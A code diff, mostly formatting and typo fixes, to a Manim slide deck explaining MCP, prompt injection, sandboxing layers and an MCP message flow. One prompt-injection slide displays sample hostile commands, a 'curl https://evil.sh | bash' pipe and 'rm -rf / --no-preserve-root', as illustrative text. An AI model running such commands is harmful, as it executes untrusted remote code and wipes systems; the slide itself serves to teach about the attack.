@@ -38,6 +38,7 @@ MUTED = SEC
 SUPPORTED_STYLES = set(get_all_styles())
 DEFAULT_STYLE = "monokai"
 
+
 def H(text: str, scale: float = 1.0, color: str = DARK, **kw) -> Text:
     return Text(text, color=color, weight=BOLD, **kw).scale(scale)
 
@@ -140,12 +141,12 @@ class MCPPresentation(Slide):
         self._slide_missinformation()
         self._slide_mcp_vs_skills()
         self._slide_mcp_vs_cli()
-        self._slide_wolfram()       
+        self._slide_wolfram()
         self._mcp_websites()
         self._slide_network_protocol()
         self._slide_network_protocol_mcp()
         self._slide_mcp_flow()
-        #animation
+        # animation
         self._slide_connect()
         self._slide_conclusions()
         self._slide_thanks()
@@ -275,7 +276,7 @@ class MCPPresentation(Slide):
         server_sub = B("Exposes tools & resources", color=SEC, scale=0.42).next_to(
             server, DOWN, buff=0.1
         )
-        client_sub = B("app that calls tools via LLM's", color=SEC, scale=0.42).next_to(
+        client_sub = B("App that calls tools via LLM's", color=SEC, scale=0.42).next_to(
             client, DOWN, buff=0.1
         )
 
@@ -327,9 +328,9 @@ class MCPPresentation(Slide):
         ]
         row2_data = [
             ("connect", CRAIL),
-            ("  with  ", DARK),
+            ("  to  ", DARK),
             ("external", SEC),
-            ("  tools as  ", DARK),
+            ("  through ", DARK),
             ("code functions", TERT),
         ]
 
@@ -382,11 +383,9 @@ class MCPPresentation(Slide):
         self.next_slide()
         self._clear()
 
-
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE  — MCP adopters
     # ═════════════════════════════════════════════
-
 
     def _slide_mcp_adopters(self):
         anchor = self._header("Who Is Using MCP?")
@@ -424,14 +423,14 @@ class MCPPresentation(Slide):
 
         # ── Company / project data ───────────────────────────────────────────────
         companies = [
-            ("companies/c1.jpg", "GitHub",   "Repos",     CRAIL),
-            ("companies/c2.png", "Canva",    "Desing",     SEC),
-            ("companies/c3.jpg", "Figma",    "Desing",   TERT),
-            ("companies/c4.png", "Blender",  "3D modeling",         CLOUDY),
-            ("companies/c5.png", "Ghidra",   "Reverse\n Engineer",   DARK),
+            ("companies/c1.jpg", "GitHub", "Repos", CRAIL),
+            ("companies/c2.png", "Canva", "Design", SEC),
+            ("companies/c3.jpg", "Figma", "Design", TERT),
+            ("companies/c4.png", "Blender", "3D modeling", CLOUDY),
+            ("companies/c5.png", "Ghidra", "Reverse\nEngineering", DARK),
         ]
 
-        IMG_W, IMG_H = 1.0, 1.0   # image bounding box
+        IMG_W, IMG_H = 1.0, 1.0  # image bounding box
         CARD_W, CARD_H = 1.9, 2.4
         CARD_BUFF = 0.28
 
@@ -456,8 +455,8 @@ class MCPPresentation(Slide):
             if logo.get_height() > IMG_H:
                 logo.scale_to_fit_height(IMG_H)
 
-            name_label = B(name,  color=accent, weight=BOLD, scale=0.52)
-            desc_label  = B(desc,  color=DARK,  weight=NORMAL, scale=0.38)
+            name_label = B(name, color=accent, weight=BOLD, scale=0.52)
+            desc_label = B(desc, color=DARK, weight=NORMAL, scale=0.38)
 
             content = Group(logo, name_label, desc_label).arrange(DOWN, buff=0.18)
             content.move_to(bg.get_center())
@@ -487,6 +486,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(note))
         self.next_slide()
         self._clear()
+
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE  — Why Tools? + meme
     # ══════════════════════════════════════════════════════════════════════════
@@ -876,6 +876,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(cblock))
         self.next_slide()
         self._clear()
+
     def _slide_ai_imo_win(self):
         anchor = self._header("AI Conquers the Math Olympiad")
 
@@ -884,12 +885,20 @@ class MCPPresentation(Slide):
         row2_data = [("win", TERT), ("  🥇 Gold  ", DARK), ("at IMO 2025", CRAIL)]
 
         row1 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row1_data
+            ]
         ).arrange(RIGHT, buff=0.1)
         row2 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row2_data
+            ]
         ).arrange(RIGHT, buff=0.1)
-        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        headline = (
+            VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        )
         headline.set_x(0)
 
         # ── Sub-caption ─────────────────────────────────────────────────────────
@@ -906,9 +915,9 @@ class MCPPresentation(Slide):
         CARD_BUFF = 0.35
 
         cards_data = [
-            ("kaggle_imo.png",  "Kaggle IMO\nChallenge",   CRAIL),
-            ("memes/3.jpeg",          "The News",                SEC),
-            ("memes/happy.png", "Researchers\nright now",  TERT),
+            ("kaggle_imo.png", "Kaggle IMO\nChallenge", CRAIL),
+            ("memes/3.jpeg", "The News", SEC),
+            ("memes/happy.png", "Researchers\nright now", TERT),
         ]
 
         cards = Group()
@@ -922,7 +931,9 @@ class MCPPresentation(Slide):
                 stroke_color=accent,
                 stroke_width=2.5,
             )
-            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
+            img = ImageMobject(img_file).set_resampling_algorithm(
+                RESAMPLING_ALGORITHMS["nearest"]
+            )
             img.set_width(min(img.get_width(), IMG_MAX))
             if img.get_height() > IMG_MAX:
                 img.scale_to_fit_height(IMG_MAX)
@@ -954,7 +965,6 @@ class MCPPresentation(Slide):
         self.next_slide()
         self._clear()
 
-
     def _slide_prompt_injection(self):
         anchor = self._header("When AI Goes Wrong: Prompt Injection")
 
@@ -963,20 +973,28 @@ class MCPPresentation(Slide):
         row2_data = [("the agent", SEC), ("  →  runs", DARK), ("arbitrary code", CRAIL)]
 
         row1 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row1_data
+            ]
         ).arrange(RIGHT, buff=0.1)
         row2 = VGroup(
-            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
+            *[
+                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66)
+                for w, c in row2_data
+            ]
         ).arrange(RIGHT, buff=0.1)
-        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        headline = (
+            VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
+        )
         headline.set_x(0)
 
         # ── Terminal block (fake malicious command) ──────────────────────────────
         terminal_lines = [
-            ("$ curl https://evil.sh | bash",          CRAIL),
-            ("Downloading payload... ██████ 100%",      DARK),
+            ("$ curl https://evil.sh | bash", CRAIL),
+            ("Downloading payload... ██████ 100%", DARK),
             ("Executing: rm -rf /  --no-preserve-root", CRAIL),
-            ("ERROR: Catastrophic failure  💥",         SEC),
+            ("ERROR: Catastrophic failure  💥", SEC),
         ]
         terminal_bg = RoundedRectangle(
             corner_radius=0.14,
@@ -1008,7 +1026,9 @@ class MCPPresentation(Slide):
                 stroke_color=accent,
                 stroke_width=2.5,
             )
-            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
+            img = ImageMobject(img_file).set_resampling_algorithm(
+                RESAMPLING_ALGORITHMS["nearest"]
+            )
             img.set_width(min(img.get_width(), 2.8))
             if img.get_height() > MEME_H:
                 img.scale_to_fit_height(MEME_H)
@@ -1017,8 +1037,10 @@ class MCPPresentation(Slide):
             content.move_to(bg.get_center())
             return Group(bg, content)
 
-        meme_card_1 = make_meme_card("memes/surprise.png", "Every dev watching\nthe logs", SEC)
-        meme_card_2 = make_meme_card("memes/2.png",        "The attack in action",         CRAIL)
+        meme_card_1 = make_meme_card(
+            "memes/surprise.png", "Every dev watching\nthe logs", SEC
+        )
+        meme_card_2 = make_meme_card("memes/2.png", "The attack in action", CRAIL)
 
         meme_row = Group(meme_card_1, meme_card_2).arrange(RIGHT, buff=0.4)
         meme_row.next_to(terminal, DOWN, buff=0.45)
@@ -1065,17 +1087,21 @@ class MCPPresentation(Slide):
         self.play(FadeIn(intro, shift=UP * 0.1))
 
         layer_data = [
-            (CRAIL, "Namespaces / cgroups",  "Isolate PID, network, FS "),
-            (CRAIL, "seccomp filter",        "Whitelist safe syscalls, block fork, execve, socket"),
-            (DARK,  "Network = none",        "Network namespace with zero egress, no DNS"),
-            (DARK,  "CPU + Wall limits",     "external watchdog kills runaway processes"),
+            (CRAIL, "Namespaces / cgroups", "Isolate PID, network, FS "),
+            (
+                CRAIL,
+                "seccomp filter",
+                "Whitelist safe syscalls, block fork, execve, socket",
+            ),
+            (DARK, "Network = none", "Network namespace with zero egress, no DNS"),
+            (DARK, "CPU + Wall limits", "external watchdog kills runaway processes"),
         ]
 
-        PILL_X   = -3.8   # horizontal center of all pills
-        PILL_W   =  5.6   # wide enough for longest label
-        PILL_H   =  0.64  # tall enough to breathe
-        DESC_X   =  0.8   # left-edge anchor for descriptions
-        ROW_BUFF =  0.62  # vertical gap — more space between rows
+        PILL_X = -3.8  # horizontal center of all pills
+        PILL_W = 5.6  # wide enough for longest label
+        PILL_H = 0.64  # tall enough to breathe
+        DESC_X = 0.8  # left-edge anchor for descriptions
+        ROW_BUFF = 0.62  # vertical gap — more space between rows
 
         rows = []
         for i, (color, label, desc) in enumerate(layer_data):
@@ -1114,25 +1140,27 @@ class MCPPresentation(Slide):
         anchor = self._header("Arbitrary Code Execution — How Platforms Do It")
 
         # ── platform comparison (top) ─────────────────────────────────────────
-        plat_title = B("Real-world implementations", color=CRAIL, weight=BOLD, scale=0.52)
+        plat_title = B(
+            "Real-world implementations", color=CRAIL, weight=BOLD, scale=0.52
+        )
         plat_title.next_to(anchor, DOWN, buff=0.35)
         plat_title.set_x(0)
 
         platforms = [
             (CRAIL, "Codeforces", "isolate + ptrace syscall allow-list"),
-            (CRAIL, "Replit",     "gVisor (runsc) + Nix per-repl envs"),
-            (DARK,  "AWS Lambda", "Firecracker microVM — ~125 ms boot"),
-            (DARK,  "IOI Judge",  "isolate — open-source, battle-tested"),
+            (CRAIL, "Replit", "gVisor (runsc) + Nix per-repl envs"),
+            (DARK, "AWS Lambda", "Firecracker microVM — ~125 ms boot"),
+            (DARK, "IOI Judge", "isolate — open-source, battle-tested"),
         ]
 
-        NAME_X   = -4.2   # left-anchor for platform names
-        DETAIL_X = -0.01   # left-anchor for detail descriptions
-        ROW_BUFF =  0.48
+        NAME_X = -4.2  # left-anchor for platform names
+        DETAIL_X = -0.01  # left-anchor for detail descriptions
+        ROW_BUFF = 0.48
 
         plat_rows = []
         for i, (color, name, detail) in enumerate(platforms):
-            name_mob   = B(name,   color=color, weight=BOLD, scale=0.50)
-            detail_mob = B(detail, color=SEC,               scale=0.46)
+            name_mob = B(name, color=color, weight=BOLD, scale=0.50)
+            detail_mob = B(detail, color=SEC, scale=0.46)
 
             name_mob.set_x(NAME_X + name_mob.width / 2)
             detail_mob.set_x(DETAIL_X + detail_mob.width / 2)
@@ -1146,7 +1174,9 @@ class MCPPresentation(Slide):
         self.play(
             LaggedStart(
                 *[
-                    AnimationGroup(FadeIn(n, shift=RIGHT * 0.12), FadeIn(d, shift=RIGHT * 0.12))
+                    AnimationGroup(
+                        FadeIn(n, shift=RIGHT * 0.12), FadeIn(d, shift=RIGHT * 0.12)
+                    )
                     for n, d in plat_rows
                 ],
                 lag_ratio=0.22,
@@ -1334,6 +1364,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(col_invoke))
         self.next_slide()
         self._clear()
+
     def _slide_is_mcp_dead(self):
         anchor = self._header("Is MCP Dead?")
 
@@ -1342,27 +1373,35 @@ class MCPPresentation(Slide):
             ["8.jpg", "9.png"],
         ]
 
-        IMG_W    = 4.8   # width of each image
-        H_GAP    = 0.30  # horizontal gap between columns
-        V_GAP    = 0.25  # vertical gap between rows
+        IMG_W = 4.8  # width of each image
+        H_GAP = 0.30  # horizontal gap between columns
+        V_GAP = 0.25  # vertical gap between rows
 
         grid_mobs = []
         for r, row in enumerate(images_grid):
             for c, path in enumerate(row):
-                if os.path.exists("memes/"+path):
-                    img = ImageMobject("memes/"+path).scale_to_fit_width(IMG_W)
+                if os.path.exists("memes/" + path):
+                    img = ImageMobject("memes/" + path).scale_to_fit_width(IMG_W)
                 else:
                     # fallback placeholder if file missing
                     img = Rectangle(
-                        width=IMG_W, height=IMG_W * 0.6,
-                        fill_color=CLOUDY, fill_opacity=0.2,
-                        stroke_color=CLOUDY, stroke_width=1,
+                        width=IMG_W,
+                        height=IMG_W * 0.6,
+                        fill_color=CLOUDY,
+                        fill_opacity=0.2,
+                        stroke_color=CLOUDY,
+                        stroke_width=1,
                     )
                     lbl = B(path, color=SEC, scale=0.45).move_to(img)
                     img = Group(img, lbl)
 
                 x = (c - 0.5) * (IMG_W + H_GAP)
-                y = anchor.get_bottom()[1] - 0.25 - (IMG_W * 0.6 + V_GAP) * r - (IMG_W * 0.6) / 2
+                y = (
+                    anchor.get_bottom()[1]
+                    - 0.25
+                    - (IMG_W * 0.6 + V_GAP) * r
+                    - (IMG_W * 0.6) / 2
+                )
                 img.set_x(x)
                 img.set_y(y)
                 grid_mobs.append(img)
@@ -1376,6 +1415,7 @@ class MCPPresentation(Slide):
 
         self.next_slide()
         self._clear()
+
     def _slide_missinformation(self):
         anchor = self._header("Внимание! Внимание!")
 
@@ -1392,6 +1432,7 @@ class MCPPresentation(Slide):
 
         self.next_slide()
         self._clear()
+
     # ══════════════════════════════════════════════════════════════════════════
     # SLIDE  — MCP vs CLI vs Skills
     # ══════════════════════════════════════════════════════════════════════════
@@ -1419,7 +1460,7 @@ class MCPPresentation(Slide):
         head_mcp = B("MCP Servers", color=CRAIL, weight=BOLD, scale=0.65).shift(
             RIGHT * 2.2 + UP * 1.5
         )
-        #divline = DashedLine(UP * 1.7, DOWN * 2.7, color=TERT, stroke_width=1.5)
+        # divline = DashedLine(UP * 1.7, DOWN * 2.7, color=TERT, stroke_width=1.5)
 
         skills_mobs = (
             VGroup(*[B(f"—  {p}", color=SEC, scale=0.40) for p in skills_items])
@@ -1453,7 +1494,7 @@ class MCPPresentation(Slide):
         )
         summary_group = VGroup(summary_box, summary).to_edge(DOWN, buff=0.28)
 
-        self.play(FadeIn(head_skills), FadeIn(head_mcp))#, Create(divline))
+        self.play(FadeIn(head_skills), FadeIn(head_mcp))  # , Create(divline))
         self.play(
             LaggedStart(
                 *[FadeIn(m, shift=RIGHT * 0.15) for m in skills_mobs], lag_ratio=0.18
@@ -1466,6 +1507,7 @@ class MCPPresentation(Slide):
         self.play(FadeIn(summary_group, shift=UP * 0.15))
         self.next_slide()
         self._clear()
+
     def _slide_mcp_vs_cli(self):
         anchor = self._header("Problems MCP Solves That CLI Cannot")
 
@@ -1634,27 +1676,38 @@ class MCPPresentation(Slide):
 
         # ── column definitions ─────────────────────────────────────────────────
         COL_LABELS = ["Client", "MCP Server", "LLM", "External\nData Source"]
-        COL_X      = [-5.1, -1.7,  1.7,  5.1]
-        HDR_Y      =  2.30
-        TOP_Y      =  2.00
-        BOT_Y      = -3.40
+        COL_X = [-5.1, -1.7, 1.7, 5.1]
+        HDR_Y = 2.30
+        TOP_Y = 2.00
+        BOT_Y = -3.40
 
         # ── headers ────────────────────────────────────────────────────────────
         headers = []
         for label, x in zip(COL_LABELS, COL_X):
-            box = RoundedRectangle(
-                corner_radius=0.13, width=2.35, height=0.62,
-                fill_color=PAMPAS, fill_opacity=1.0,
-                stroke_color=CRAIL, stroke_width=1.5,
-            ).set_x(x).set_y(HDR_Y)
+            box = (
+                RoundedRectangle(
+                    corner_radius=0.13,
+                    width=2.35,
+                    height=0.62,
+                    fill_color=PAMPAS,
+                    fill_opacity=1.0,
+                    stroke_color=CRAIL,
+                    stroke_width=1.5,
+                )
+                .set_x(x)
+                .set_y(HDR_Y)
+            )
             txt = B(label, color=DARK, weight=BOLD, scale=0.42).move_to(box)
             headers.append(VGroup(box, txt))
 
         # ── lifelines ──────────────────────────────────────────────────────────
         lifelines = [
             DashedLine(
-                [x, TOP_Y, 0], [x, BOT_Y, 0],
-                color=CLOUDY, stroke_width=0.9, dash_length=0.10,
+                [x, TOP_Y, 0],
+                [x, BOT_Y, 0],
+                color=CLOUDY,
+                stroke_width=0.9,
+                dash_length=0.10,
             )
             for x in COL_X
         ]
@@ -1666,24 +1719,24 @@ class MCPPresentation(Slide):
         # ── message definitions ────────────────────────────────────────────────
         # (from_col, to_col, label, is_return, is_internal)
         messages = [
-            (0, 1, "1. Request available tools",       False, False),
-            (1, 0, "2. List of tools",                 True,  False),
-            (0, 2, "3. User query + tools info",        False, False),
-            (2, 0, "4. Instruct: use specific tool",    False, False),
-            (0, 2, "5. Execute tool internally",         False, True ),
-            (1, 3, "6. Request data",                   False, False),
-            (3, 1, "7. Data response",                  True,  False),
-            (1, 0, "8. Retrieved data",                 True,  False),
-            (0, 2, "9. User query + retrieved data",    False, False),
-            (2, 0, "10. Final response",                True,  False),
+            (0, 1, "1. Request available tools", False, False),
+            (1, 0, "2. List of tools", True, False),
+            (0, 2, "3. User query + tools info", False, False),
+            (2, 0, "4. Instruct: use specific tool", False, False),
+            (0, 2, "5. Execute tool internally", False, True),
+            (1, 3, "6. Request data", False, False),
+            (3, 1, "7. Data response", True, False),
+            (1, 0, "8. Retrieved data", True, False),
+            (0, 2, "9. User query + retrieved data", False, False),
+            (2, 0, "10. Final response", True, False),
         ]
 
-        MSG_Y0   =  1.60
-        MSG_STEP =  0.50
-        PAD      =  0.28   # gap between lifeline and arrow tip/tail
+        MSG_Y0 = 1.60
+        MSG_STEP = 0.50
+        PAD = 0.28  # gap between lifeline and arrow tip/tail
 
         for i, (src, dst, label, is_return, is_internal) in enumerate(messages):
-            y  = MSG_Y0 - i * MSG_STEP
+            y = MSG_Y0 - i * MSG_STEP
             xs = COL_X[src]
             xd = COL_X[dst]
 
@@ -1691,7 +1744,7 @@ class MCPPresentation(Slide):
             if is_internal:
                 loop = CurvedArrow(
                     start_point=[xs + 0.15, y + 0.18, 0],
-                    end_point  =[xs + 0.15, y - 0.18, 0],
+                    end_point=[xs + 0.15, y - 0.18, 0],
                     angle=-TAU / 4,
                     color=ORANGE,
                     stroke_width=1.5,
@@ -1702,12 +1755,13 @@ class MCPPresentation(Slide):
 
             # ── directional arrow ──────────────────────────────────────────────
             color = SEC if is_return else CRAIL
-            sign  = 1 if xd > xs else -1
+            sign = 1 if xd > xs else -1
             x_from = xs + sign * PAD
-            x_to   = xd - sign * PAD
+            x_to = xd - sign * PAD
 
             raw = Arrow(
-                [x_from, y, 0], [x_to, y, 0],
+                [x_from, y, 0],
+                [x_to, y, 0],
                 buff=0,
                 color=color,
                 stroke_width=1.8,
